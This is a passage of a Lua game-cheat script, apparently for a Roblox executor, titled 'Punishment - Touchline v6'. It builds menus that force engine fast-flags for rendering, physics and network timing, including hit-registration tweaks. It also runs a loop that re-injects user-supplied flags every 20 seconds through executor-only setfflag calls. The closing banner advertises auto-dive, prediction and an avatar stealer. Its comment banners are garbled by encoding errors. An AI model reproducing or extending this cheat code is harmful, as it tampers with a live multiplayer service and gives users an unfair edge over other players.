TabFlags:CreateInput("Avatar LOD Min Threshold",      "min distance for LOD switch",                  "e.g. 1",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntLodAvatarMinThreshold",tostring(n)) end end)
TabFlags:CreateInput("Missed World Steps Cap",        "max missed steps before re-sim (lower=smoother)","e.g. 2",   nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntMaxMissedWorldStepsRemembered",tostring(n)) end end)

TabFlags:CreateDivider()

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  VISUAL â€” TYPABLE
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabFlags:CreateSection("ðŸŽ¨ Visual / Rendering")

TabFlags:CreateInput("MSAA Samples",                  "0/1/2/4/8 â€” anti-aliasing",                    "e.g. 0",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntDebugForceMSAASamples",tostring(n)) end end)
TabFlags:CreateInput("Texture Quality",               "-1=auto, 0=lowest â†’ 4=highest",                "e.g. 0",     nil, nil, function(v)
    local val=tonumber(v) if not val then return end
    if val==-1 then
        sf("DFFlagTextureQualityOverrideEnabled","false"); sf("DFIntTextureQualityOverride","0"); sf("FIntDebugTextureManagerSkipMips","0")
    else
        sf("DFFlagTextureQualityOverrideEnabled","true"); sf("DFIntTextureQualityOverride",tostring(val)); sf("FIntDebugTextureManagerSkipMips",val==0 and "2" or "0")
    end
end)
TabFlags:CreateInput("Mipmap Skip Level",             "0=none, 1/2/3/4=skip mips (saves VRAM)",       "e.g. 2",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntDebugTextureManagerSkipMips",tostring(n)) end end)
TabFlags:CreateInput("Terrain Array Slice Size",      "2=best, 4=perf (terrain detail)",              "e.g. 4",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntTerrainArraySliceSize",tostring(n)) end end)
TabFlags:CreateInput("Shadow Intensity",              "0=none, 1=normal, 100=max",                    "e.g. 0",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntRenderShadowIntensity",tostring(n)) end end)
TabFlags:CreateInput("Global Shadows Light Influence","0=no shadow influence, 100=full",              "e.g. 0",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntGlobalShadowsLightInfluence",tostring(n)) end end)
TabFlags:CreateInput("Lighting Mode",                 "0=auto, 1=voxel, 2=shadowmap, 3=future",      "e.g. 1",     nil, nil, function(v)
    local val=tonumber(v) if not val then return end
    sf("DFFlagDebugRenderForceTechnologyVoxel",     val==1 and "true" or "false")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase2",val==2 and "true" or "false")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase3",val==3 and "true" or "false")
end)
TabFlags:CreateInput("CSG LOD Distance",              "lower = less LOD switching (4=aggressive)",    "e.g. 4",     nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntCSGLevelOfDetailSwitchingDistance",tostring(n));sf("DFIntCSGLevelOfDetailSwitchingDistanceL12",tostring(n));sf("DFIntCSGLevelOfDetailSwitchingDistanceL23",tostring(n));sf("DFIntCSGLevelOfDetailSwitchingDistanceL34",tostring(n)) end end)
TabFlags:CreateInput("Disable CSG LOD",               "true/false â€” kills LOD entirely",              "true / false",nil,nil,function(v) sf("FFlagDisableCSGLevelOfDetail",v) end)
TabFlags:CreateInput("Disable PostFX",                "true/false",                                   "true / false",nil,nil,function(v) sf("FFlagDisablePostFx",v) end)
TabFlags:CreateInput("Gray Sky",                      "true/false â€” gray skybox",                     "true / false",nil,nil,function(v) sf("FFlagDebugSkyGray",v) end)
TabFlags:CreateInput("Show FPS Counter",              "true/false",                                   "true / false",nil,nil,function(v) sf("FFlagDebugDisplayFPS",v) end)
TabFlags:CreateInput("Animation LOD Distance Min",    "0=always full anim detail",                    "e.g. 0",     nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntAnimationLodFacsDistanceMin",tostring(n)) end end)

TabFlags:CreateDivider()

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  NETWORK / HITREG â€” TYPABLE
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabFlags:CreateSection("ðŸŒ Network / Hitreg")

TabFlags:CreateInput("Target Time Delay (TT)",        "lower = faster hit registration (0â€“15)",       "e.g. 12",    nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntTargetTimeDelayFacctorTenths",tostring(n)) end end)
TabFlags:CreateInput("Interpolation Max Delay (ms)",  "lower = less interp lag (0â€“90)",               "e.g. 8",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntInterpolationMaxDelayMSec",tostring(n)) end end)
TabFlags:CreateInput("Physics Sender Rate (S2)",      "higher = more physics updates sent (60â€“120)",  "e.g. 90",    nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntS2PhysicsSenderRate",tostring(n)) end end)
TabFlags:CreateInput("Connection MTU Size",           "packet size â€” 900 is sweetspot",               "e.g. 900",   nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntConnectionMTUSize",tostring(n)) end end)
TabFlags:CreateInput("RakNet Resend Buffer Length",   "higher = better packet recovery (128)",        "e.g. 128",   nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntRakNetResendBufferArrayLength",tostring(n)) end end)
TabFlags:CreateInput("RakNet Loop MS",                "network loop interval â€” 16 = 60fps sync",      "e.g. 16",    nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntRakNetLoopMs",tostring(n)) end end)
TabFlags:CreateInput("Codec Max Incoming Packets",    "higher = handle more packets per frame",       "e.g. 64",    nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntCodecMaxIncomingPackets",tostring(n)) end end)
TabFlags:CreateInput("Optimize Network",              "true/false â€” enables network optimizations",   "true / false",nil,nil,function(v) sf("FFlagOptimizeNetwork",v) end)
TabFlags:CreateInput("Optimize Network Packets",      "1=on, 0=off",                                  "e.g. 1",     nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntOptimizeNetworkPacketsByValue",tostring(n)) end end)
TabFlags:CreateInput("Physics Receive Results Mult",  "higher = more sim results buffered (32)",      "e.g. 32",    nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntPhysicsReceiveNumSimulationResultsMultiplier",tostring(n)) end end)
TabFlags:CreateInput("Physics Packet Cache Size",     "larger cache = smoother physics recv",         "e.g. 128",   nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntPhysicsPacketCacheSize",tostring(n)) end end)
TabFlags:CreateInput("Network Heartbeat Wait MS",     "0 = no wait between heartbeats",               "e.g. 0",     nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntNetworkRunServiceHeartbeatWaitMs",tostring(n)) end end)
TabFlags:CreateInput("Send Data Buffer Target Size",  "32 is recommended",                            "e.g. 32",    nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntSimSendDataBufferTargetSize",tostring(n)) end end)
TabFlags:CreateInput("Max Unreliable Msg Size (KB)",  "larger = bigger unreliable packets",           "e.g. 64",    nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntMaxUnreliableMessageSizeKB",tostring(n)) end end)
TabFlags:CreateInput("Num Clients Near Threshold",    "affects server lag detection",                 "e.g. 10",    nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntNumClientsIsNearThreshold",tostring(n)) end end)
TabFlags:CreateInput("HTTP Curl Connection Timeout",  "seconds before HTTP timeout (5=fast fail)",    "e.g. 5",     nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntHttpCurlConnectionTimeout",tostring(n)) end end)
TabFlags:CreateInput("Replication Bandwidth Limit",   "false=unlimited replication bandwidth",        "true / false",nil,nil,function(v) sf("FFlagReplicationDataLimitedBandwidth",v) end)

TabFlags:CreateDivider()

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  PHYSICS â€” TYPABLE
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabFlags:CreateSection("âš™ï¸ Physics")

TabFlags:CreateInput("Physics LOD Projectile Iters",  "ray cast iterations for projectiles",          "e.g. 8",     nil, nil, function(v) local n=tonumber(v) if n then sf("FIntPhysicsLODProjectileRayCastIterations",tostring(n)) end end)
TabFlags:CreateInput("Sim Adaptive Hang Time (ms)",   "ms before adaptive sim kicks in",              "e.g. 100",   nil, nil, function(v) local n=tonumber(v) if n then sf("FIntSimAdaptiveHangTimeThresholdMs",tostring(n)) end end)
TabFlags:CreateInput("Bullet Contact Break Threshold","orthogonal threshold % for bullet contacts",   "e.g. 10",    nil, nil, function(v) local n=tonumber(v) if n then sf("DFIntBulletContactBreakOrthogonalThresholdPercent",tostring(n)) end end)

TabFlags:CreateDivider()

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  RESET ALL
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabFlags:CreateSection("ðŸ”„ Reset")
TabFlags:CreateButton("Reset All Flags to Default", "undoes everything above", nil, function()
    sf("DFIntTaskSchedulerTargetFps",                               "60")
    sf("FFlagTaskSchedulerLimitTargetFpsTo2402",                    "false")
    sf("FFlagDebugDisplayFPS",                                      "false")
    sf("FFlagDebugSkyGray",                                         "false")
    sf("FIntDebugForceMSAASamples",                                 "0")
    sf("DFFlagTextureQualityOverrideEnabled",                       "false")
    sf("DFIntTextureQualityOverride",                               "0")
    sf("FIntDebugTextureManagerSkipMips",                           "0")
    sf("FIntRenderShadowIntensity",                                 "1")
    sf("FFlagDisablePostFx",                                        "false")
    sf("FIntTerrainArraySliceSize",                                 "2")
    sf("DFFlagDebugRenderForceTechnologyVoxel",                     "false")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase2",                "false")
    sf("DFFlagDebugRenderForceFutureIsBrightPhase3",                "false")
    sf("DFIntTargetTimeDelayFacctorTenths",                         "13")
    sf("FIntInterpolationMaxDelayMSec",                             "90")
    sf("DFIntS2PhysicsSenderRate",                                  "60")
    sf("DFIntConnectionMTUSize",                                    "1400")
    sf("DFIntRakNetResendBufferArrayLength",                        "32")
    sf("DFIntRakNetLoopMs",                                         "33")
    sf("DFIntCodecMaxIncomingPackets",                              "32")
    sf("FFlagOptimizeNetwork",                                      "false")
    sf("DFIntMaxFrameBufferSize",                                   "4")
    sf("FIntRenderLocalLightUpdatesMax",                            "8")
    sf("FIntRenderLocalLightUpdatesMin",                            "3")
    sf("FIntRenderMaxManagingLightEntities",                        "500")
    sf("FIntRenderMaxSimultaneousLights",                           "8")
    sf("FIntGlobalShadowsLightInfluence",                           "25")
    sf("DFIntCSGLevelOfDetailSwitchingDistance",                    "128")
    sf("DFIntCSGLevelOfDetailSwitchingDistanceL12",                 "128")
    sf("DFIntCSGLevelOfDetailSwitchingDistanceL23",                 "128")
    sf("DFIntCSGLevelOfDetailSwitchingDistanceL34",                 "128")
    sf("FFlagDisableCSGLevelOfDetail",                              "false")
    sf("DFIntAvatarLODDecimationGain",                              "0")
    sf("FIntLodAvatarMinThreshold",                                 "10")
    sf("DFIntMaxMissedWorldStepsRemembered",                        "10")
    sf("DFIntMaxUnreliableMessageSizeKB",                           "4")
    sf("DFIntAnimationLodFacsDistanceMin",                          "6")
    sf("FFlagReplicationDataLimitedBandwidth",                      "true")
    punishgoatby97mzu:Notify({ Title="Flags", Content="All flags reset to default.", Duration=3 })
end)

-- â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
--  JSON FLAG INJECT (unchanged)
-- â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
TabFlags:CreateDivider()
TabFlags:CreateSection("JSON Flag Inject")
TabFlags:CreateLabel('Paste JSON. Format: {"FlagName":"value"}')

local _injectThread = nil
local _injectFlags  = {}

TabFlags:CreateInput("Flag JSON", 'Paste raw JSON', '{"DFIntTargetTimeDelayFacctorTenths":"7"}', nil, nil, function(v)
    if not v or v == "" then return end
    local ok, decoded = pcall(function() return game:GetService("HttpService"):JSONDecode(v) end)
    if ok and type(decoded) == "table" then
        _injectFlags = decoded
        punishgoatby97mzu:Notify({ Title="Inject", Content="Flags parsed.", Duration=3 })
    else
        punishgoatby97mzu:Notify({ Title="Inject Error", Content="Invalid JSON.", Duration=4 })
    end
end)

TabFlags:CreateButton("Start JSON Inject", "injects parsed flags every 20s", nil, function()
    if _injectThread then task.cancel(_injectThread) end
    _injectThread = task.spawn(function()
        while true do
            if setfflag then
                for k, v in pairs(_injectFlags) do
                    local ck = k:gsub("^DFInt",""):gsub("^DFFlag",""):gsub("FString",""):gsub("FLog",""):gsub("^FFlag",""):gsub("^DFint",""):gsub("^FInt","")
                    pcall(function()
                        if getfflag(ck) ~= nil then setfflag(ck, tostring(v))
                        elseif getfflag(k)  ~= nil then setfflag(k,  tostring(v))
                        end
                    end)
                end
            end
            task.wait(20)
        end
    end)
    punishgoatby97mzu:Notify({ Title="Inject", Content="Inject loop started.", Duration=3 })
end)

TabFlags:CreateButton("Stop JSON Inject", "stops the inject loop", nil, function()
    if _injectThread then task.cancel(_injectThread); _injectThread = nil end
    punishgoatby97mzu:Notify({ Title="Inject", Content="Inject loop stopped.", Duration=3 })
end)

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  NOTIFY
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
punishgoatby97mzu:Notify({
    Title    = "Punishment - Touchline v6",
    Content  = "Movement-based AutoDive | Smart GK | Prediction | Reacts | Flags | Extras | Avatar Stealer",
    Duration = 6,
})